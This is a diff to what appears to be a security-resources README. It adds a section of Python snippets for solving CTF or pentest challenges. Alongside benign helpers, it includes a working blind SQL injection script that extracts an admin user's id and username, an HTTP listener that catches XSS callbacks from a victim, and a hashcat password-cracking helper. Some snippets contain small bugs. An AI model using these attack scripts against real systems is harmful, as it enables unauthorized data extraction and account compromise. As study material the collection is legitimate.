@@ -126,6 +126,7 @@
   - [Blog](#blog)
   - [Tools](#tools-2)
   - [Other](#other-3)
+- [Code Snippets](#code-snippets)
 - [Code Analysis](#code-analysis)
   - [Static Code Analysis](#static-code-analysis)
 - [Linux](#linux)
@@ -2508,6 +2509,259 @@ Pagenation
 - [2017年LINE Security Bug Bounty Programの結果について - LINE ENGINEERING](https://engineering.linecorp.com/ja/blog/detail/255/)
   - [archive](https://web.archive.org/web/20210619223511/https://engineering.linecorp.com/ja/blog/detail/255/)
 
+## Code Snippets
+
+```bash
+# show pydoc
+python3 -m pydoc requests
+python3 -m pydoc requests.Response
+```
+
+datetime
+
+```python
+# now to epoch
+from datetime import datetime
+datetime.now().strftime('%s')
+# output => '1700187759'
+
+# fromisoformat
+datetime.fromisoformat('2023-11-17T11:25:24+00:00')
+datetime.fromisoformat('2023-11-17T11:25:24+09:00')
+```
+
+string, hex
+
+```python
+import binascii
+
+binascii.hexlify(b'abcd')
+# => b'61626364'
+
+int(b'61626364', base=16)
+# => 1633837924
+
+binascii.unhexlify(hex(1633837924)[2:])
+# => b'abcd'
+
+# bytes string to hex string
+b"deadbeef".hex()
+# => '6465616462656566'
+```
+
+base solver.py template
+
+```python
+import requests
+
+requests.packages.urllib3.disable_warnings()
+s = requests.Session()
+# s.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+s.verify = False
+
+BASE_URL = "https://localhost:8000"
+
+
+def main():
+    pass
+
+
+if __name__ == "__main__":
+    main()
+```
+
+SQLi with binary search
+
+```python
+def binary_search_leftmost(l, r, payload_with_m):
+    def is_true(payload):
+        res = s.get(f"{BASE_URL}/", params={"order": payload})
+
+        return "Question count" in res.text
+
+    while l < r:
+        m = (l + r) // 2
+        print(f"[*] Searching in range ({l}, {r}): midpoint = {m}    ", end="\r", flush=True)
+        if is_true(payload_with_m.format(m=m)):
+            l = m + 1
+        else:
+            r = m
+
+    return l
+
+def main():
+    # get user id
+    user_id = binary_search_leftmost(
+        0,
+        100000,
+        f"name LIMIT (CASE WHEN ((SELECT id FROM users WHERE isadmin=false and ismod=true LIMIT 1) > {{m}}) THEN 1 ELSE 0 END)--",
+    )
+
+    # get username
+    length = binary_search_leftmost(
+        0,
+        100000,
+        f"name LIMIT (CASE WHEN (LENGTH((SELECT username FROM users WHERE id={user_id})) > {{m}}) THEN 1 ELSE 0 END)--",
+    )
+
+    username = ""
+    for i in range(length):
+        ret = binary_search_leftmost(
+            0x20,
+            0x7E,
+            f"name LIMIT (CASE WHEN (ASCII(SUBSTRING((SELECT username FROM users WHERE id = {user_id} LIMIT 1), {i+1}, 1)) > {{m}}) THEN 1 ELSE 0 END)--",
+        )
+        username += chr(ret)
+```
+
+ThreadPoolExecuter
+
+```python
+with ThreadPoolExecutor(max_workers=10) as executor:
+    for i in range(46135, 99999):
+        future = executor.submit(join_group, i)
+        if res := future.result():
+            executor.shutdown()
+            return res
+```
+
+requests
+
+```python
+import requests
+
+# session
+s = requests.Session()
+
+# https://requests.readthedocs.io/en/latest/api/#requests.Session.cookies
+# https://requests.readthedocs.io/en/latest/api/#requests.cookies.RequestsCookieJar
+
+# set cookie
+s.cookies.update({"token": foobar})
+
+# clear cookie
+s.cookies.clear()
+
+# post file
+s.post(
+    f"{BASE_URL}/actions/contact.php",
+    files={"image": ("test.jpg", open("xss.jpg", "rb"), "image/jpeg")},
+)
+
+# post empty file
+s.post(
+    f"{BASE_URL}/actions/contact.php",
+    files={"image": ("test.jpg", b"")},
+)
+```
+
+HTTP Listener for XSS with Event threading
+
+```python
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import threading
+
+
+SHUTDOWN_EVENT = threading.Event()
+
+LPORT = 80
+LHOST = "192.168.45.226"
+
+
+class ThreadingHTTPServer(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"")
+
+        # shutdown ThreadingHTTPServer
+        SHUTDOWN_EVENT.set()
+
+
+def listen_xss_server():
+    httpd = HTTPServer(("0.0.0.0", LPORT), ThreadingHTTPServer)
+
+    server_thread = threading.Thread(target=httpd.serve_forever)
+    server_thread.start()
+    print(f"[*] HTTPServer is running on port {LPORT} to access by victim")
+
+    print(f"[*] Wait for XSS ping back...")
+    SHUTDOWN_EVENT.wait()
+    print(f"[*] Ping back!")
+
+    httpd.shutdown()
+    server_thread.join()
+    print("[*] HTTPServer has stopped")
+
+
+def send_xss_payload():
+    pass
+
+
+def main():
+    send_xss_payload()
+    listen_xss_server()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+Python subprocess return output
+
+```python
+# run hashcat via subprocess
+def crack_password(hashed_password, guess_passwords):
+    result = subprocess.run(
+        f"hashcat -m 100 {hash} passwords.txt --quiet",
+        shell=True,
+        capture_output=True,
+        text=True,
+    )
+
+    assert result.stdout, "error"
+
+    password = result.stdout.split(":")[1].strip()
+    return password
+```
+
+re
+
+```python
+# multiple line
+m = re.findall(r"<database>(.*)</database>", resp.text, re.MULTILINE | re.DOTALL)
+asset m, "Not matched"
+
+return m[0]
+```
+
+socketio with proxy
+
+```python
+import requests
+
+requests.packages.urllib3.disable_warnings()
+s = requests.Session()
+# s.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+s.verify = False
+
+BASE_URL = "http://localhost"
+
+class WS:
+    def __init__(self):
+        self._sio = socketio.SimpleClient(http_session=s)
+        self._sio.connect(f"{BASE_URL}", transports=["websocket"])
+
+    def emit(self, msg, data):
+        self._sio.emit(msg, data)
+
+    def recv(self):
+        return self._sio.receive()
+
+    def __exit__(self):
+        self._sio.close()
+```
+
 ## Code Analysis
 
 Papers
@@ -2713,42 +2967,6 @@ Payload
 #### Decompile
 
 - [Decompile compiled python binaries (exe, elf) - Retreive from .pyc - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/.pyc)
-
-#### CheatSheet
-
-- [Python3 Cheat Sheet | SANS](https://assets.contentstack.io/v3/assets/blt36c2e63521272fdc/blt81d030ecd27e1e5d/5e50122503d2600dc053d3ee/Python3-Cheat-Sheet.pdf)
-
-```bash
-# show pydoc
-python3 -m pydoc requests
-python3 -m pydoc requests.Response
-```
-
-```python
-# now to epoch
-from datetime import datetime
-datetime.now().strftime('%s')
-# output => '1700187759'
-
-# fromisoformat
-datetime.fromisoformat('2023-11-17T11:25:24+00:00')
-datetime.fromisoformat('2023-11-17T11:25:24+09:00')
-```
-
-string, hex
-
-```python
-import binascii
-
-binascii.hexlify(b'abcd')
-# => b'61626364'
-
-int(b'61626364', base=16)
-# => 1633837924
-
-binascii.unhexlify(hex(1633837924)[2:])
-# => b'abcd'
-```
 
 #### YAML Deserialization
 
